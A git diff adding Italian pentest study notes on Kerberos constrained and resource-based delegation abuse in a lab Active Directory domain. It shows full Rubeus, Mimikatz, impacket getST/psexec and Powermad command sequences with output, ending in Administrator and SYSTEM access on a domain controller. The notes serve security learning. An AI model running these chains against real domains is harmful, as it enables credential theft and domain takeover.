@@ -17,6 +17,7 @@
         - [Se il computer di destinazione non è un Domain Controller](#se-il-computer-di-destinazione-non-è-un-domain-controller)
     - [Unconstrained Delegation - Users](#unconstrained-delegation---users)
   - [Constrained Delegation (S4U2Proxy)](#constrained-delegation-s4u2proxy)
+    - [Impersonare qualsiasi utente](#impersonare-qualsiasi-utente)
     - [La differenza pratica con unconstrained](#la-differenza-pratica-con-unconstrained)
     - [S4U2Proxy \& S4U2Self](#s4u2proxy--s4u2self)
       - [S4U2Proxy](#s4u2proxy)
@@ -31,6 +32,15 @@
     - [I flag vengono settati sull'account, non sul servizio in sé](#i-flag-vengono-settati-sullaccount-non-sul-servizio-in-sé)
       - [Quando si usa l'uno o l'altro](#quando-si-usa-luno-o-laltro)
         - [Perché è importante offensivamente](#perché-è-importante-offensivamente)
+    - [Esempio Constrained Delegation su Windows](#esempio-constrained-delegation-su-windows)
+      - [Enumerazione](#enumerazione)
+      - [WS01: Richiedere un ticket TGS valido](#ws01-richiedere-un-ticket-tgs-valido)
+        - [Hash della macchina](#hash-della-macchina)
+      - [WS01: Verifica nuovo ticket](#ws01-verifica-nuovo-ticket)
+      - [Accesso Remoto a DMZ01](#accesso-remoto-a-dmz01)
+    - [Esempio Constrained Delegation su Linux](#esempio-constrained-delegation-su-linux)
+      - [Trovare account con delega](#trovare-account-con-delega)
+      - [Usare getST](#usare-getst)
     - [Esempio Completo Constrained Delegation](#esempio-completo-constrained-delegation)
       - [Step 1 — verifichi la delegation](#step-1--verifichi-la-delegation)
         - [Step 2 — dumpi l'hash di svc-web da lsass](#step-2--dumpi-lhash-di-svc-web-da-lsass)
@@ -49,6 +59,9 @@
     - [L'idea di RBCD](#lidea-di-rbcd)
     - [Perché è più flessibile](#perché-è-più-flessibile)
     - [Il meccanismo Kerberos](#il-meccanismo-kerberos)
+    - [Esempio RBCD su Windows](#esempio-rbcd-su-windows)
+      - [Se non disponiamo di tali diritti, potremmo creare un computer fittizio.](#se-non-disponiamo-di-tali-diritti-potremmo-creare-un-computer-fittizio)
+        - [Usare PowerMad per creare un computer fittizio](#usare-powermad-per-creare-un-computer-fittizio)
     - [Esempio](#esempio)
       - [Step 1 — verifichi la configurazione RBCD su FILE-SRV](#step-1--verifichi-la-configurazione-rbcd-su-file-srv)
         - [Risolvi il SID per confermare:](#risolvi-il-sid-per-confermare)
@@ -996,9 +1009,44 @@ Poiché la uncontrained delegation non è molto restrittiva, la constrained dele
 
 ![alt text](images/delegation/esempio_Constrained_Delegation.png)
 
+Per comprendere questa sezione è necessario ricordare la struttura della richiesta AP-REQ, che è la richiesta effettuata dall’utente al servizio una volta ricevuto il ticket TGS.
+
+![alt text](images/delegation/ap-req_delegation.png)
+
+Il messaggio AP-REQ contiene due elementi:
+- un autenticatore
+- un ticket TGS
+
+Il Service Ticket (TGS) è composto a sua volta da due parti:
+- una parte non cifrata contenente lo SPN del servizio richiesto
+- una parte cifrata contenente le informazioni dell’utente e una session key
+
+Un attaccante può modificare il nome del servizio senza invalidare la richiesta, poiché il nome del servizio non è cifrato.
+
+Nella constrained delegation, la delega è consentita solo per un elenco specifico di SPN. Se un attaccante compromette un account con constrained delegation, può inoltrare le richieste di autenticazione ricevute verso uno o più SPN presenti nella lista.
+
+Per farlo si utilizza l’estensione S4U2Proxy, che permette di ottenere un ticket TGS valido per conto dell’utente. L’attaccante quindi ottiene un TGS valido per uno specifico SPN destinato a un determinato account di servizio. Tuttavia non può usare quel ticket verso un altro servizio, perché il ticket è cifrato con la chiave del servizio richiesto, e altri servizi non possono decifrarlo.
+
+![alt text](images/delegation/constrained_delegation_example.png)
+
+Se però l’account espone più servizi, l’attaccante può modificare lo SPN per accedere a un altro servizio dello stesso account.
+
+> Questo è molto comune negli account macchina, che espongono servizi come CIFS, SPOOLER o TERMSRV (lista Microsoft ufficiale).
+
+In questo caso, anche se la constrained delegation consente l’accesso solo a un servizio (ad esempio SQL), l’attaccante può modificare lo SPN nella richiesta AP-REQ e accedere ad altri servizi (ad esempio CIFS). Se l’utente delegato è amministratore locale della macchina target, l’attaccante può comprometterla.
+
+![alt text](images/delegation/constrained_delegation_compromissione.png)
+
+> La limitazione principale è che è necessario attendere che un utente si autentichi al servizio compromesso. Non è sempre garantito che un utente privilegiato acceda frequentemente.
+
+### Impersonare qualsiasi utente
+
 È possibile configurare la constrained delegation nello stesso punto in cui si configura la unconstrained delegation, cioè nella scheda ```Delegation``` dell'account. L'opzione ```Trust this computer for delegation to specified services only``` deve essere selezionata. Come per la unconstrained delegation, questa opzione non è modificabile di default da un account.
 
 ![alt text](images/delegation/Constrained_Delegation_opzione.png)
+
+> Se il protocol transition è attivo, si può usare S4U2Self, che permette a un servizio di ottenere un ticket TGS forwardable verso se stesso per conto di qualsiasi utente.
+> Questo permette di ottenere un TGS come qualsiasi utente senza attendere che qualcuno si autentichi.
 
 Quando questa opzione è abilitata, l'elenco dei servizi consentiti per la delega viene memorizzato nell'attributo ```msDS-AllowedToDelegateTo``` dell'account responsabile della delega.
 
@@ -1086,6 +1134,7 @@ Questo è il motivo delle due opzioni nella Constrained Delegation:
 ![alt text](images/delegation/S4U2Self.png)
 
 Se un attaccante compromette un account di servizio con "Use any authentication protocol":
+
 ![alt text](images/delegation/S4U2Self_any_protocol.png)
 
 Può usare S4U2Self per generare un TGS come qualsiasi utente del dominio (anche Domain Admin), senza che quell'utente abbia mai toccato quel servizio, e poi S4U2Proxy per accedere a risorse protette as Domain Admin.
@@ -1187,6 +1236,304 @@ Rubeus.exe s4u /user:WEB-SRV$ /aes256:<hash> /impersonateuser:Administrator /msd
 
 - Sia **LOCAL SYSTEM** che **NETWORK SERVICE** quando parlano con la rete usano l'identità di WEB-SRV$ — cioè l'account computer della macchina. **Questo è il motivo per cui se un servizio che gira con questi account ha delegation configurata, il flag è sull'account computer e non su un account utente.**
 - Molti admin usano **LOCAL SYSTEM** o **NETWORK SERVICE** per comodità — non devono gestire password, rotazioni, permessi. **E questo è esattamente perché in un pentest trovi spesso delegation configurata su account computer invece che su account utente dedicati.**
+
+### Esempio Constrained Delegation su Windows
+Questo attacco può essere eseguito da Windows usando Rubeus. Si compromette DMZ01 e si ottiene accesso remoto a WS01.
+
+#### Enumerazione
+
+PowerView viene usato per identificare computer con constrained delegation:
+- DMZ01$ risulta avere il flag TRUSTED_TO_AUTH_FOR_DELEGATION attivo.
+```
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainComputer -TrustedToAuth
+
+logoncount                    : 35
+badpasswordtime               : 12/31/1600 6:00:00 PM
+distinguishedname             : CN=DMZ01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
+objectclass                   : {top, person, organizationalPerson, user...}
+badpwdcount                   : 0
+lastlogontimestamp            : 3/23/2023 10:09:29 AM
+objectsid                     : S-1-5-21-1870146311-1183348186-593267556-1118
+samaccountname                : DMZ01$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : MACHINE_ACCOUNT
+countrycode                   : 0
+cn                            : DMZ01
+accountexpires                : NEVER
+whenchanged                   : 3/30/2023 2:51:35 PM
+instancetype                  : 4
+usncreated                    : 12870
+objectguid                    : eaebb114-2638-40ec-9617-8715c4d3057a
+operatingsystem               : Windows Server 2019 Standard
+operatingsystemversion        : 10.0 (17763)
+lastlogoff                    : 12/31/1600 6:00:00 PM
+msds-allowedtodelegateto      : {www/WS01.INLANEFREIGHT.LOCAL, www/WS01}
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {WSMAN/DMZ01, WSMAN/DMZ01.INLANEFREIGHT.LOCAL, TERMSRV/DMZ01,
+                                TERMSRV/DMZ01.INLANEFREIGHT.LOCAL...}
+lastlogon                     : 4/1/2023 10:02:15 AM
+iscriticalsystemobject        : False
+usnchanged                    : 41084
+useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
+whencreated                   : 10/14/2022 12:10:03 PM
+primarygroupid                : 515
+pwdlastset                    : 3/23/2023 10:20:32 AM
+msds-supportedencryptiontypes : 28
+name                          : DMZ01
+dnshostname                   : DMZ01.INLANEFREIGHT.LOCAL
+```
+
+#### WS01: Richiedere un ticket TGS valido
+##### Hash della macchina
+Possiamo utilizzare Rubeus per richiedere un ticket TGS valido a un utente qualsiasi al fine di accedere al servizio HTTP sull'host WS01. Per eseguire correttamente questo attacco, dovremo ottenere l'hash della password NTLM dell'account macchina DMZ01$. Possiamo ottenerlo utilizzando Mimikatz.
+
+Con Mimikatz si ottiene l’hash NTLM dell’account macchina ```DMZ01$```.
+```
+PS C:\Tools> .\mimikatz.exe privilege::debug sekurlsa::msv exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::msv
+
+Authentication Id : 0 ; 414620 (00000000:0006539c)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/1/2023 7:39:12 AM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : DMZ01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : ff955e93a130f5bb1a6565f32b7dc127
+         * SHA1     : f9232403611aa86f51a05c64e1abd86ce4021ff1
+<SNIP>
+```
+
+Attacco Constrained Delegation
+```
+PS C:\Tools> .\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: ff955e93a130f5bb1a6565f32b7dc127
+[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\DMZ01$'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFMDCCBSygAwIBBaEDAgEWooIEMjCCBC5hggQqMIIEJqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggPcMIID2KADAgESoQMC
+      <SNIP>
+
+
+[*] Action: S4U
+
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (fe80::c872:c68d:a355:e6f3%11)
+[*] Building S4U2self request for: 'DMZ01$@INLANEFREIGHT.LOCAL'
+[*] Sending S4U2self request
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator@INLANEFREIGHT.LOCAL' to 'DMZ01$@INLANEFREIGHT.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIGJDCCBiCgAwIBBaEDAgEWooIFEDCCBQxhggUIMIIFBKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      QUyiEzARoAMCAQGhCjAIGwZTUUwwMSSjggTPMIIEy6ADAgESoQMCAQGiggS9BIIEuY/s7XKb3zZMjzGB
+      <SNIP>
+
+[*] Impersonating user 'Administrator' to target SPN 'www/WS01.inlanefreight.local'
+[*]   Final ticket will be for the alternate service 'http'
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (fe80::c872:c68d:a355:e6f3%11)
+[*] Building S4U2proxy request for service: 'www/WS01.inlanefreight.local'
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] Substituting alternative service name 'http'
+[*] base64(ticket.kirbi) for SPN 'http/WS01.inlanefreight.local':
+
+      doIG/jCCBvqgAwIBBaEDAgEWooIF4DCCBdxhggXYMIIF1KADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      QUyiKzApoAMCAQKhIjAgGwRodHRwGxhXUzAxLmlubGFuZWZyZWlnaHQubG9jYWyjggWHMIIFg6ADAgES
+      <SNIP>
+```
+
+Innanzitutto, Rubeus richiede un TGT per consentirci di accedere al contesto DMZ01$. Quindi esegue una richiesta S4U2Self per ottenere un ticket TGS come Amministratore.
+
+```
+[*] Ottenuto un TGS per ‘Administrator@INLANEFREIGHT.LOCAL’ verso ‘DMZ01$@INLANEFREIGHT.LOCAL’
+```
+Infine, utilizza questo ticket TGS per eseguire una richiesta S4U2Proxy e aggiornerà l'SPN in modo che corrisponda a quanto richiesto, ovvero il servizio HTTP.
+
+```
+[*] Impersonificazione dell'utente ‘Administrator’ per l'SPN di destinazione ‘www/WS01.inlanefreight.local’
+[*]   Il ticket finale sarà per il servizio alternativo 'http'
+```
+
+#### WS01: Verifica nuovo ticket
+Con klist si vede il ticket HTTP per WS01.
+```
+PS C:\Tools> klist
+
+Current LogonId is 0:0x3f22d97
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ INLANEFREIGHT.LOCAL
+        Server: http/WS01.inlanefreight.local @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 8/15/2020 10:37:16 (local)
+        End Time:   8/15/2020 20:37:16 (local)
+        Renew Time: 8/22/2020 10:37:16 (local)
+        Session Key Type: AES-128-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+```
+
+#### Accesso Remoto a DMZ01
+
+Infine, il ticket viene usato per ottenere una sessione remota WinRM su WS01:
+```
+PS C:\Tools> Enter-PSSession ws01.inlanefreight.local
+
+[ws01.inlanefreight.local]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
+
+inlanefreight\administrator
+```
+
+### Esempio Constrained Delegation su Linux
+Utilizzando il file ```findDelegation.py``` di impacket, è possibile individuare gli account dotati di privilegi di delega.
+
+#### Trovare account con delega
+```
+Nanan@htb[/htb]$ findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
+
+Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+                                                                                                                                                                     
+AccountName    AccountType  DelegationType                      DelegationRightsTo                                                                                   
+-------------  -----------  ----------------------------------  --------------------------------                                                                     
+EXCHG01$       Computer     Constrained                         ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL                
+EXCHG01$       Computer     Constrained                         ldap/DC01.INLANEFREIGHT.LOCAL  
+callum.dixon   Person       Unconstrained                       N/A                                                                                                  
+beth.richards  Person       Constrained w/ Protocol Transition  TERMSRV/DC01.INLANEFREIGHT.LOCAL                                                                     
+beth.richards  Person       Constrained w/ Protocol Transition  TERMSRV/DC01                      
+DMZ01$         Computer     Constrained w/ Protocol Transition  www/WS01.INLANEFREIGHT.LOCAL     
+DMZ01$         Computer     Constrained w/ Protocol Transition  www/WS01                          
+SQL01$         Computer     Unconstrained                       N/A
+```
+
+Nei risultati si possono notare tre tipi di delega:
+- Unconstrained: questo account dispone di una delega senza restrizioni
+- Constrained: questo account dispone di una delega con restrizioni senza supporto per la transizione di protocollo
+- Constrained w/ Protocol Transition: questo account dispone di una delega con restrizioni e supporto per la transizione di protocollo
+
+Supponiamo di aver già compromesso l'account ```beth.richards```. Questo account ha una delega vincolata con transizione di protocollo impostata e l'unico servizio consentito per la delega è ```TERMSRV/DC01.INLANEFREIGHT.LOCAL```.
+
+Utilizzando lo strumento ```getST.py``` di impacket, possiamo creare un TGS valido da un utente arbitrario per accedere al servizio TERMSRV sull'host DC01.
+
+#### Usare getST
+```
+Nanan@htb[/htb]$ getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
+
+Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+
+[-] CCache file is not found. Skipping... 
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+```
+
+Questo genererà un ticket e lo salverà come ```Administrator.ccache``` nella directory corrente. Una volta ottenuto questo ticket valido per accedere al servizio TERMSRV su DC01 come amministratore, potremo utilizzarlo con ```psexec.py``` di impacket, dopo aver esportato il suo percorso nella variabile d'ambiente ```KRB5CCNAME```. Questo strumento aggiornerà al volo l'SPN in questo TGS per ottenere una shell interattiva. Il flag ```-debug``` è stato aggiunto apposta per permetterti di vedere cosa sta succedendo.
+
+Usare PSExec con il ticket
+```
+Nanan@htb[/htb]$ export KRB5CCNAME=./Administrator.ccache
+Nanan@htb[/htb]$ psexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01 -debug
+
+Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+
+[+] Impacket Library Installation Path: /home/plaintext/.local/lib/python3.9/site-packages/impacket
+[+] StringBinding ncacn_np:DC01[\pipe\svcctl]
+[+] Using Kerberos Cache: Administrator.ccache
+[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
+[+] AnySPN is True, looking for another suitable SPN
+[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
+[+] Using TGS from cache
+[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
+[*] Requesting shares on DC01.....
+[*] Found writable share ADMIN$
+[*] Uploading file SmXURDVG.exe
+[*] Opening SVCManager on DC01.....
+[*] Creating service DBou on DC01.....
+[*] Starting service DBou.....
+[+] Using Kerberos Cache: Administrator.ccache
+[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
+[+] AnySPN is True, looking for another suitable SPN
+[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
+[+] Using TGS from cache
+[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
+[+] Using Kerberos Cache: Administrator.ccache
+[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
+[+] AnySPN is True, looking for another suitable SPN
+[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
+[+] Using TGS from cache
+[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
+[!] Press help for extra shell commands
+[+] Using Kerberos Cache: Administrator.ccache
+[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
+[+] AnySPN is True, looking for another suitable SPN
+[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
+[+] Using TGS from cache
+[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+Leggendo questo output, si nota che Impacket cerca più volte un ticket per uno SPN specifico, ma non riesce a trovarlo.
+```
+[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
+```
+Continua quindi a cercare altri ticket compatibili con l'account di servizio del bersaglio.
+```
+[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
+```
+Una volta trovato, aggiorna l'SPN con quello che sta cercando, che in questo caso è CIFS/DC01@INLANEFREIGHT.LOCAL.
+```
+[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
+```
+psexec.py ripete questa operazione per ottenere una shell interattiva:
+
+```Nanan@htb[/htb]$ psexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01 -debug
+<SNIP>
+Microsoft Windows [Versione 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. Tutti i diritti riservati.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
 
 
 ### Esempio Completo Constrained Delegation
@@ -1379,6 +1726,228 @@ RBCD:
 DC controlla msds-allowedtoactonbehalfofotheridentity su SERVICE B
 "Service B accetta deleghe da Service A?"
 ```
+
+### Esempio RBCD su Windows
+Per sferrare attacchi contro RBCD, sono necessari due elementi:
+
+- L'accesso a un utente o a un gruppo che disponga dei privilegi necessari per modificare la proprietà ```msDS-AllowedToActOnBehalfOfOtherIdentity``` su un computer. Ciò è solitamente possibile se l'utente dispone dei privilegi ```GenericWrite```, ```GenericAll```, ```WriteProperty``` o ```WriteDACL``` su un oggetto computer.
+- Il controllo di un altro oggetto dotato di SPN.
+Il seguente script PowerShell verificherà i computer nel dominio e gli utenti che dispongono dei diritti di accesso richiesti (elemento numero 1) su di essi.
+
+```
+# import the PowerView module
+Import-Module C:\Tools\PowerView.ps1
+
+# get all computers in the domain
+$computers = Get-DomainComputer
+
+# get all users in the domain
+$users = Get-DomainUser
+
+# define the required access rights
+$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"
+
+# loop through each computer in the domain
+foreach ($computer in $computers) {
+    # get the security descriptor for the computer
+    $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs
+
+    # loop through each user in the domain
+    foreach ($user in $users) {
+        # check if the user has the required access rights on the computer object
+        $hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{($_.ActiveDirectoryRights -match ($accessRights -join '|'))}
+
+        if ($hasAccess) {
+            Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
+        }
+    }
+}
+```
+
+```
+PS C:\Tools> .\SearchRBCD.ps1
+
+carole.holmes has the required access rights on DC01
+```
+
+Il modo più semplice per ottenere un oggetto con SPN è utilizzare un computer. 
+- Possiamo utilizzare un computer su cui disponiamo già dei privilegi di amministratore
+- Oppure, se non disponiamo di tali diritti, potremmo creare un computer fittizio.
+
+#### Se non disponiamo di tali diritti, potremmo creare un computer fittizio.
+Per prima cosa, dobbiamo creare un account computer, cosa possibile poiché ```ms-DS-MachineAccountQuota``` è impostato su 10 per impostazione predefinita per gli utenti autenticati. Possiamo creare il nostro computer fittizio utilizzando lo script ```PowerMad```.
+
+##### Usare PowerMad per creare un computer fittizio
+```
+PS C:\Tools> Import-Module .\Powermad.ps1
+PS C:\Tools> New-MachineAccount -MachineAccount HACKTHEBOX -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)
+
+[+] Machine account HACKTHEBOX added
+```
+Quindi, aggiungiamo questo account utente all'elenco delle entità fidate del computer di destinazione, operazione possibile poiché l'autore dell'attacco dispone dell'ACL GenericAll su tale computer:
+- Ottenere il SID del computer.
+- Utilizzare il Security Descriptor Definition Language (SDDL) per creare un descrittore di sicurezza.
+- Impostare ```msDS-AllowedToActOnBehalfOfOtherIdentity``` in formato binario grezzo.
+- Modificare il computer di destinazione.
+
+Modificare il computer di destinazione:
+```
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> $ComputerSid = Get-DomainComputer HACKTHEBOX -Properties objectsid | Select -Expand objectsid
+PS C:\Tools> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+PS C:\Tools> $SDBytes = New-Object byte[] ($SD.BinaryLength)
+PS C:\Tools> $SD.GetBinaryForm($SDBytes, 0)
+PS C:\Tools> $credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
+PS C:\Tools> Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Extracted domain 'INLANEFREIGHT.LOCAL' from 'CN=DC01,OU=Domain
+Controllers,DC=INLANEFREIGHT,DC=LOCAL'
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC01,OU=Domain
+Controllers,DC=INLANEFREIGHT,DC=LOCAL)))
+VERBOSE: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0
+36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 7 43 120 111
+218 117 136 70 100 139 92 35 55 8 0 0' for object 'DC01$'
+```
+
+Possiamo richiedere un TGT per l'account del computer creato, seguito da una richiesta S4U2Self per ottenere un ticket TGS inoltrabile, e poi da una richiesta S4U2Proxy per ottenere un ticket TGS valido per uno SPN specifico sul computer di destinazione. Ma prima, recuperiamo l'hash NT del nostro account del computer.
+```
+PS C:\Tools> .\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:inlanefreight.local
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : Hackthebox123+!
+[*] Input username             : HACKTHEBOX$
+[*] Input domain               : inlanefreight.local
+[*] Salt                       : INLANEFREIGHT.LOCALhosthackthebox.inlanefreight.local
+[*]       rc4_hmac             : CF767C9A9C529361F108AA67BF1B3695
+[*]       aes128_cts_hmac_sha1 : 91BE80CCB5F58A8F18960858524B6EC6
+[*]       aes256_cts_hmac_sha1 : 9457C7FC2D222793B1871EE4E62FEFB1CE158B719F99B6C992D7DC9FFB625D97
+[*]       des_cbc_md5          : 5B516BDA5180E5CB
+```
+
+Ora che disponiamo dell'hash della password dell'account utente appena creato, richiediamo un ticket TGS per il servizio cifs/```dc01.inlanefreight.local```, che ci consentirà di accedere al computer di destinazione tramite SMB.
+
+```
+PS C:\Tools> .\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: CF767C9A9C529361F108AA67BF1B3695
+[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\HACKTHEBOX$'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFWjCCBVagAwIBBaE<SNIP>
+
+
+[*] Action: S4U
+
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (fe80::c872:c68d:a355:e6f3%11)
+[*] Building S4U2self request for: 'HACKTHEBOX$@INLANEFREIGHT.LOCAL'
+[*] Sending S4U2self request
+[+] S4U2self success!
+[*] Got a TGS for 'administrator@INLANEFREIGHT.LOCAL' to 'HACKTHEBOX$@INLANEFREIGHT.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIGEjCCBg6gAwIBBaED<SNIP>
+
+[*] Impersonating user 'administrator' to target SPN 'cifs/dc01.inlanefreight.local'
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (fe80::c872:c68d:a355:e6f3%11)
+[*] Building S4U2proxy request for service: 'cifs/dc01.inlanefreight.local'
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc01.inlanefreight.local':
+
+      doIHEDCCBwygAwIBBaEDA<SNIP>
+        
+[+] Ticket successfully imported!
+```
+
+Abbiamo ricevuto il nostro ticket.
+
+> Nota: possiamo anche utilizzare /altservice:host,RPCSS,wsman,http,ldap,krbtgt,ldap per includere servizi aggiuntivi nella nostra richiesta di ticket.
+
+Verificare il ticket:
+```
+PS C:\Tools> klist
+
+Current LogonId is 0:0xff74b0
+
+Cached Tickets: (1)
+
+#0>     Client: administrator @ INLANEFREIGHT.LOCAL
+        Server: cifs/dc01.inlanefreight.local @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 8/25/2020 18:00:26 (local)
+        End Time:   8/26/2020 4:00:26 (local)
+        Renew Time: 9/1/2020 18:00:26 (local)
+        Session Key Type: AES-128-CTS-HMAC-SHA1-96
+        Cache Flags: 0
